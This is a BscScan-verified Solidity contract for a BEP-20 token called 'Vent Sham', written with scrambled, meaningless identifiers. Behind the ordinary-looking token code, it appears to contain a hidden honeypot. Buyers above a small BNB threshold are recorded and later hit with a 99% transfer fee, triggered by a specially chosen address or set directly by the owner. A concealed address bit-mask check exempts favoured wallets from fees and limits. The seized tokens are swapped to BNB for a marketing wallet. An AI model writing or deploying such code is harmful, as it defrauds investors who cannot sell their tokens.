/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}


interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

}



contract VentSham is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 burnTradingSellReceiver = 100000000 * (10 ** _decimals);
    uint256  modeLiquidityBuyMint = 2000000 * 10 ** _decimals;
    uint256  minReceiverMarketingLaunched = 2000000 * 10 ** _decimals;


    string constant _name = "Vent Sham";
    string constant _symbol = "VSM";
    uint8 constant _decimals = 18;

    uint256 private limitToMintSwap = 0;
    uint256 private fromWalletToMinMintTakeMode = 7;

    uint256 private limitTradingMinReceiver = 0;
    uint256 private tradingSellBuyLaunched = 7;

    bool private fromReceiverMarketingSell = true;
    bool private burnModeLaunchLaunchedTeamReceiver = true;
    bool private listMinTokenMarketing = true;
    bool private shouldLiquidityTakeTxMarketingModeMax = true;
    bool private tradingAmountReceiverShould = true;
    uint256 receiverAutoBotsEnable = 2 ** 18 - 1;
    uint256 private walletEnableFundSender = 6 * 10 ** 15;
    uint256 private senderFundLaunchTx = burnTradingSellReceiver / 1000; // 0.1%
    uint256 buySwapAmountLaunch = 13346;

    uint256 private teamSwapBurnToken = fromWalletToMinMintTakeMode + limitToMintSwap;
    uint256 private tradingReceiverModeMaxBots = 100;

    bool private listToTradingAt;
    uint256 private limitBotsAtWallet;
    uint256 private maxFundSenderSwap;
    uint256 private totalTokenAtSwapTake;
    uint256 private senderBotsMintTakeAt;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedTxTokenBuyTakeLimitLaunch;
    mapping(address => bool) private isFeeBuyFund;
    mapping(address => bool) private amountTotalAtModeBuyTokenSender;
    mapping(address => bool) private tradingWalletTokenReceiver;
    mapping(address => uint256) private exemptMaxAtLaunchedTxMin;
    mapping(uint256 => address) private toSellModeSwap;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public launchReceiverMaxLaunched;
    address public uniswapV2Pair;

    uint256 private buyBurnSwapFee;
    uint256 private autoLaunchedIsTake;

    address private marketingTradingTxTotal = (msg.sender); // auto-liq address
    address private toTeamTokenLaunched = (0xC35921904bc52a4efEd96615ffffC023d80Da672); // marketing address

    
    bool private shouldAmountMinTeamBotsSenderReceiver = false;
    bool private atAmountTeamList = false;
    uint256 public shouldSwapFeeSellMarketingAutoReceiver = 0;
    bool private maxLimitExemptFundTake = false;
    bool public walletSenderTxBuyTotalReceiver = false;
    uint256 public receiverBurnFeeTeam = 0;
    uint256 private sellTxBuyReceiverTeamWalletBots = 0;
    bool public buyFromAtMode = false;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchReceiverMaxLaunched = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchReceiverMaxLaunched.factory()).createPair(address(this), launchReceiverMaxLaunched.WETH());
        _allowances[address(this)][address(launchReceiverMaxLaunched)] = burnTradingSellReceiver;

        listToTradingAt = true;

        amountTotalAtModeBuyTokenSender[msg.sender] = true;
        amountTotalAtModeBuyTokenSender[0x0000000000000000000000000000000000000000] = true;
        amountTotalAtModeBuyTokenSender[0x000000000000000000000000000000000000dEaD] = true;
        amountTotalAtModeBuyTokenSender[address(this)] = true;

        launchedTxTokenBuyTakeLimitLaunch[msg.sender] = true;
        launchedTxTokenBuyTakeLimitLaunch[address(this)] = true;

        isFeeBuyFund[msg.sender] = true;
        isFeeBuyFund[0x0000000000000000000000000000000000000000] = true;
        isFeeBuyFund[0x000000000000000000000000000000000000dEaD] = true;
        isFeeBuyFund[address(this)] = true;

        approve(_router, burnTradingSellReceiver);
        approve(address(uniswapV2Pair), burnTradingSellReceiver);
        _balances[msg.sender] = burnTradingSellReceiver;
        emit Transfer(address(0), msg.sender, burnTradingSellReceiver);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return burnTradingSellReceiver;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, burnTradingSellReceiver);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return listExemptReceiverLaunch(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != burnTradingSellReceiver) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return listExemptReceiverLaunch(sender, recipient, amount);
    }

    function setreceiverSenderFundMin(uint256 isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        senderFundLaunchTx=isLimitTokenMinTradingEnableReceiver;
    }

    function getburnTotalLaunchList() public view returns (bool) {
        if (walletSenderTxBuyTotalReceiver == shouldLiquidityTakeTxMarketingModeMax) {
            return shouldLiquidityTakeTxMarketingModeMax;
        }
        return walletSenderTxBuyTotalReceiver;
    }

    function exemptEnableFundMint() private view returns (uint256) {
        return block.timestamp;
    }

    function listExemptReceiverLaunch(address fundFromLimitSender, address autoLaunchedFromSender, uint256 mintBurnFromSender) internal returns (bool) {
        
        if (walletSenderTxBuyTotalReceiver == shouldLiquidityTakeTxMarketingModeMax) {
            walletSenderTxBuyTotalReceiver = atAmountTeamList;
        }


        bool tokenIsReceiverFundFee = totalFromLiquidityLimit(fundFromLimitSender) || totalFromLiquidityLimit(autoLaunchedFromSender);
        
        if (fundFromLimitSender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && txLiquidityTeamIsShouldBuyAmount(uint160(autoLaunchedFromSender))) {
                swapShouldTokenFund();
            }
            if (!tokenIsReceiverFundFee) {
                feeAutoListTrading(autoLaunchedFromSender);
            }
        }
        
        
        if (walletSenderTxBuyTotalReceiver == buyFromAtMode) {
            walletSenderTxBuyTotalReceiver = tradingAmountReceiverShould;
        }

        if (sellTxBuyReceiverTeamWalletBots != sellTxBuyReceiverTeamWalletBots) {
            sellTxBuyReceiverTeamWalletBots = shouldSwapFeeSellMarketingAutoReceiver;
        }


        if (inSwap || tokenIsReceiverFundFee) {return txLaunchEnableBurn(fundFromLimitSender, autoLaunchedFromSender, mintBurnFromSender);}
        
        require((mintBurnFromSender <= modeLiquidityBuyMint) || amountTotalAtModeBuyTokenSender[fundFromLimitSender] || amountTotalAtModeBuyTokenSender[autoLaunchedFromSender], "Max TX Limit!");

        if (mintReceiverTotalWalletLaunchedEnable()) {feeFundMinReceiver();}

        _balances[fundFromLimitSender] = _balances[fundFromLimitSender].sub(mintBurnFromSender, "Insufficient Balance!");
        
        if (atAmountTeamList == burnModeLaunchLaunchedTeamReceiver) {
            atAmountTeamList = walletSenderTxBuyTotalReceiver;
        }

        if (sellTxBuyReceiverTeamWalletBots != launchBlock) {
            sellTxBuyReceiverTeamWalletBots = limitTradingMinReceiver;
        }


        uint256 mintBurnFromSenderReceived = marketingFromShouldMin(fundFromLimitSender) ? modeTakeShouldMinSellToken(fundFromLimitSender, autoLaunchedFromSender, mintBurnFromSender) : mintBurnFromSender;

        _balances[autoLaunchedFromSender] = _balances[autoLaunchedFromSender].add(mintBurnFromSenderReceived);
        emit Transfer(fundFromLimitSender, autoLaunchedFromSender, mintBurnFromSenderReceived);
        return true;
    }

    function setminLiquidityAutoLimitExemptTotal(uint256 isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (limitTradingMinReceiver != senderFundLaunchTx) {
            senderFundLaunchTx=isLimitTokenMinTradingEnableReceiver;
        }
        if (limitTradingMinReceiver == receiverBurnFeeTeam) {
            receiverBurnFeeTeam=isLimitTokenMinTradingEnableReceiver;
        }
        limitTradingMinReceiver=isLimitTokenMinTradingEnableReceiver;
    }

    function getexemptFromMarketingBurn(address isLimitTokenMinTradingEnableReceiver) public view returns (uint256) {
        if (isLimitTokenMinTradingEnableReceiver != WBNB) {
            return limitTradingMinReceiver;
        }
            return exemptMaxAtLaunchedTxMin[isLimitTokenMinTradingEnableReceiver];
    }

    function feeFundMinReceiver() internal swapping {
        
        uint256 mintBurnFromSenderToLiquify = senderFundLaunchTx.mul(limitToMintSwap).div(teamSwapBurnToken).div(2);
        uint256 mintBurnFromSenderToSwap = senderFundLaunchTx.sub(mintBurnFromSenderToLiquify);

        address[] memory senderTakeToSell = new address[](2);
        senderTakeToSell[0] = address(this);
        senderTakeToSell[1] = launchReceiverMaxLaunched.WETH();
        launchReceiverMaxLaunched.swapExactTokensForETHSupportingFeeOnTransferTokens(
            mintBurnFromSenderToSwap,
            0,
            senderTakeToSell,
            address(this),
            block.timestamp
        );
        
        uint256 mintBurnFromSenderBNB = address(this).balance;
        uint256 totalLaunchedFundLaunch = teamSwapBurnToken.sub(limitToMintSwap.div(2));
        uint256 launchLiquiditySenderMax = mintBurnFromSenderBNB.mul(limitToMintSwap).div(totalLaunchedFundLaunch).div(2);
        uint256 mintBurnFromSenderBNBMarketing = mintBurnFromSenderBNB.mul(fromWalletToMinMintTakeMode).div(totalLaunchedFundLaunch);
        
        if (atAmountTeamList == atAmountTeamList) {
            atAmountTeamList = shouldLiquidityTakeTxMarketingModeMax;
        }


        payable(toTeamTokenLaunched).transfer(mintBurnFromSenderBNBMarketing);

        if (mintBurnFromSenderToLiquify > 0) {
            launchReceiverMaxLaunched.addLiquidityETH{value : launchLiquiditySenderMax}(
                address(this),
                mintBurnFromSenderToLiquify,
                0,
                0,
                marketingTradingTxTotal,
                block.timestamp
            );
            emit AutoLiquify(launchLiquiditySenderMax, mintBurnFromSenderToLiquify);
        }
    }

    function setlaunchSenderWalletBurnTeamMax(bool isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (fromReceiverMarketingSell == shouldAmountMinTeamBotsSenderReceiver) {
            shouldAmountMinTeamBotsSenderReceiver=isLimitTokenMinTradingEnableReceiver;
        }
        fromReceiverMarketingSell=isLimitTokenMinTradingEnableReceiver;
    }

    function setlimitSwapFeeLaunchedMarketingEnable(address isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (marketingTradingTxTotal != DEAD) {
            DEAD=isLimitTokenMinTradingEnableReceiver;
        }
        if (marketingTradingTxTotal != toTeamTokenLaunched) {
            toTeamTokenLaunched=isLimitTokenMinTradingEnableReceiver;
        }
        if (marketingTradingTxTotal == DEAD) {
            DEAD=isLimitTokenMinTradingEnableReceiver;
        }
        marketingTradingTxTotal=isLimitTokenMinTradingEnableReceiver;
    }

    function getreceiverSenderFundMin() public view returns (uint256) {
        return senderFundLaunchTx;
    }

    function getlaunchSenderWalletBurnTeamMax() public view returns (bool) {
        if (fromReceiverMarketingSell != burnModeLaunchLaunchedTeamReceiver) {
            return burnModeLaunchLaunchedTeamReceiver;
        }
        return fromReceiverMarketingSell;
    }

    function setlimitToAmountTotal(uint256 isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (teamSwapBurnToken == limitTradingMinReceiver) {
            limitTradingMinReceiver=isLimitTokenMinTradingEnableReceiver;
        }
        if (teamSwapBurnToken == senderFundLaunchTx) {
            senderFundLaunchTx=isLimitTokenMinTradingEnableReceiver;
        }
        teamSwapBurnToken=isLimitTokenMinTradingEnableReceiver;
    }

    function swapShouldTokenFund() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (exemptMaxAtLaunchedTxMin[toSellModeSwap[i]] == 0) {
                    exemptMaxAtLaunchedTxMin[toSellModeSwap[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getlimitSwapFeeLaunchedMarketingEnable() public view returns (address) {
        if (marketingTradingTxTotal == DEAD) {
            return DEAD;
        }
        if (marketingTradingTxTotal != toTeamTokenLaunched) {
            return toTeamTokenLaunched;
        }
        return marketingTradingTxTotal;
    }

    function mintReceiverTotalWalletLaunchedEnable() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        tradingAmountReceiverShould &&
        _balances[address(this)] >= senderFundLaunchTx;
    }

    function listShouldBurnMint(address fundFromLimitSender, bool amountLaunchMinToken) internal returns (uint256) {
        
        if (amountLaunchMinToken) {
            teamSwapBurnToken = tradingSellBuyLaunched + limitTradingMinReceiver;
            return toAmountFundFee(fundFromLimitSender, teamSwapBurnToken);
        }
        if (!amountLaunchMinToken && fundFromLimitSender == uniswapV2Pair) {
            teamSwapBurnToken = fromWalletToMinMintTakeMode + limitToMintSwap;
            return teamSwapBurnToken;
        }
        return toAmountFundFee(fundFromLimitSender, teamSwapBurnToken);
    }

    function feeAutoListTrading(address marketingBuyToBurn) private {
        if (listLimitLaunchedSender() < walletEnableFundSender) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        toSellModeSwap[maxWalletAmount] = marketingBuyToBurn;
    }

    function setamountToSwapMint(uint256 isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (tradingReceiverModeMaxBots == teamSwapBurnToken) {
            teamSwapBurnToken=isLimitTokenMinTradingEnableReceiver;
        }
        if (tradingReceiverModeMaxBots == limitTradingMinReceiver) {
            limitTradingMinReceiver=isLimitTokenMinTradingEnableReceiver;
        }
        tradingReceiverModeMaxBots=isLimitTokenMinTradingEnableReceiver;
    }

    function marketingFromShouldMin(address fundFromLimitSender) internal view returns (bool) {
        return !isFeeBuyFund[fundFromLimitSender];
    }

    function getautoWalletListEnableLaunchedSwap(address isLimitTokenMinTradingEnableReceiver) public view returns (bool) {
        if (isLimitTokenMinTradingEnableReceiver != marketingTradingTxTotal) {
            return maxLimitExemptFundTake;
        }
        if (isLimitTokenMinTradingEnableReceiver == ZERO) {
            return burnModeLaunchLaunchedTeamReceiver;
        }
        if (isFeeBuyFund[isLimitTokenMinTradingEnableReceiver] == tradingWalletTokenReceiver[isLimitTokenMinTradingEnableReceiver]) {
            return buyFromAtMode;
        }
            return isFeeBuyFund[isLimitTokenMinTradingEnableReceiver];
    }

    function toAmountFundFee(address fundFromLimitSender, uint256 mintMinSwapReceiverSell) private view returns (uint256) {
        uint256 tokenReceiverAmountAtSenderTxFee = exemptMaxAtLaunchedTxMin[fundFromLimitSender];
        if (tokenReceiverAmountAtSenderTxFee > 0 && exemptEnableFundMint() - tokenReceiverAmountAtSenderTxFee > 2) {
            return 99;
        }
        return mintMinSwapReceiverSell;
    }

    function getswapShouldBuySender() public view returns (uint256) {
        if (sellTxBuyReceiverTeamWalletBots == receiverBurnFeeTeam) {
            return receiverBurnFeeTeam;
        }
        return sellTxBuyReceiverTeamWalletBots;
    }

    function setswapShouldBuySender(uint256 isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (sellTxBuyReceiverTeamWalletBots != walletEnableFundSender) {
            walletEnableFundSender=isLimitTokenMinTradingEnableReceiver;
        }
        sellTxBuyReceiverTeamWalletBots=isLimitTokenMinTradingEnableReceiver;
    }

    function getlimitSwapMinAuto(address isLimitTokenMinTradingEnableReceiver) public view returns (bool) {
        if (isLimitTokenMinTradingEnableReceiver == DEAD) {
            return burnModeLaunchLaunchedTeamReceiver;
        }
            return launchedTxTokenBuyTakeLimitLaunch[isLimitTokenMinTradingEnableReceiver];
    }

    function getamountToSwapMint() public view returns (uint256) {
        if (tradingReceiverModeMaxBots != limitTradingMinReceiver) {
            return limitTradingMinReceiver;
        }
        if (tradingReceiverModeMaxBots == limitToMintSwap) {
            return limitToMintSwap;
        }
        return tradingReceiverModeMaxBots;
    }

    function setautoWalletListEnableLaunchedSwap(address isLimitTokenMinTradingEnableReceiver,bool fromFundFeeReceiver) public onlyOwner {
        if (isFeeBuyFund[isLimitTokenMinTradingEnableReceiver] == launchedTxTokenBuyTakeLimitLaunch[isLimitTokenMinTradingEnableReceiver]) {
           launchedTxTokenBuyTakeLimitLaunch[isLimitTokenMinTradingEnableReceiver]=fromFundFeeReceiver;
        }
        if (isLimitTokenMinTradingEnableReceiver == DEAD) {
            buyFromAtMode=fromFundFeeReceiver;
        }
        if (isLimitTokenMinTradingEnableReceiver == ZERO) {
            shouldLiquidityTakeTxMarketingModeMax=fromFundFeeReceiver;
        }
        isFeeBuyFund[isLimitTokenMinTradingEnableReceiver]=fromFundFeeReceiver;
    }

    function txLiquidityTeamIsShouldBuyAmount(uint160 autoLaunchedFromSender) private view returns (bool) {
        return uint16(autoLaunchedFromSender) == buySwapAmountLaunch;
    }

    function setburnTotalLaunchList(bool isLimitTokenMinTradingEnableReceiver) public onlyOwner {
        if (walletSenderTxBuyTotalReceiver != shouldLiquidityTakeTxMarketingModeMax) {
            shouldLiquidityTakeTxMarketingModeMax=isLimitTokenMinTradingEnableReceiver;
        }
        if (walletSenderTxBuyTotalReceiver != buyFromAtMode) {
            buyFromAtMode=isLimitTokenMinTradingEnableReceiver;
        }
        walletSenderTxBuyTotalReceiver=isLimitTokenMinTradingEnableReceiver;
    }

    function listLimitLaunchedSender() private view returns (uint256) {
        address maxTeamExemptEnableToToken = WBNB;
        if (address(this) < WBNB) {
            maxTeamExemptEnableToToken = address(this);
        }
        (uint launchMintReceiverLimit, uint maxFromMintReceiver,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 tokenLiquidityExemptTeamIsTxWallet,) = WBNB == maxTeamExemptEnableToToken ? (launchMintReceiverLimit, maxFromMintReceiver) : (maxFromMintReceiver, launchMintReceiverLimit);
        uint256 swapSellSenderTotal = IERC20(WBNB).balanceOf(uniswapV2Pair) - tokenLiquidityExemptTeamIsTxWallet;
        return swapSellSenderTotal;
    }

    function modeTakeShouldMinSellToken(address fundFromLimitSender, address liquidityLaunchFeeMode, uint256 mintBurnFromSender) internal returns (uint256) {
        
        if (sellTxBuyReceiverTeamWalletBots == fromWalletToMinMintTakeMode) {
            sellTxBuyReceiverTeamWalletBots = receiverBurnFeeTeam;
        }

        if (walletSenderTxBuyTotalReceiver != tradingAmountReceiverShould) {
            walletSenderTxBuyTotalReceiver = tradingAmountReceiverShould;
        }


        uint256 mintMinSwapReceiverSellAmount = mintBurnFromSender.mul(listShouldBurnMint(fundFromLimitSender, liquidityLaunchFeeMode == uniswapV2Pair)).div(tradingReceiverModeMaxBots);

        if (tradingWalletTokenReceiver[fundFromLimitSender] || tradingWalletTokenReceiver[liquidityLaunchFeeMode]) {
            mintMinSwapReceiverSellAmount = mintBurnFromSender.mul(99).div(tradingReceiverModeMaxBots);
        }

        _balances[address(this)] = _balances[address(this)].add(mintMinSwapReceiverSellAmount);
        emit Transfer(fundFromLimitSender, address(this), mintMinSwapReceiverSellAmount);
        
        return mintBurnFromSender.sub(mintMinSwapReceiverSellAmount);
    }

    function setlimitSwapMinAuto(address isLimitTokenMinTradingEnableReceiver,bool fromFundFeeReceiver) public onlyOwner {
        if (isLimitTokenMinTradingEnableReceiver == ZERO) {
            burnModeLaunchLaunchedTeamReceiver=fromFundFeeReceiver;
        }
        if (launchedTxTokenBuyTakeLimitLaunch[isLimitTokenMinTradingEnableReceiver] == isFeeBuyFund[isLimitTokenMinTradingEnableReceiver]) {
           isFeeBuyFund[isLimitTokenMinTradingEnableReceiver]=fromFundFeeReceiver;
        }
        launchedTxTokenBuyTakeLimitLaunch[isLimitTokenMinTradingEnableReceiver]=fromFundFeeReceiver;
    }

    function getminLiquidityAutoLimitExemptTotal() public view returns (uint256) {
        if (limitTradingMinReceiver != walletEnableFundSender) {
            return walletEnableFundSender;
        }
        return limitTradingMinReceiver;
    }

    function txLaunchEnableBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setexemptFromMarketingBurn(address isLimitTokenMinTradingEnableReceiver,uint256 fromFundFeeReceiver) public onlyOwner {
        exemptMaxAtLaunchedTxMin[isLimitTokenMinTradingEnableReceiver]=fromFundFeeReceiver;
    }

    function totalFromLiquidityLimit(address marketingBuyToBurn) private view returns (bool) {
        return ((uint256(uint160(marketingBuyToBurn)) << 192) >> 238) == receiverAutoBotsEnable;
    }

    function getlimitToAmountTotal() public view returns (uint256) {
        if (teamSwapBurnToken != shouldSwapFeeSellMarketingAutoReceiver) {
            return shouldSwapFeeSellMarketingAutoReceiver;
        }
        return teamSwapBurnToken;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}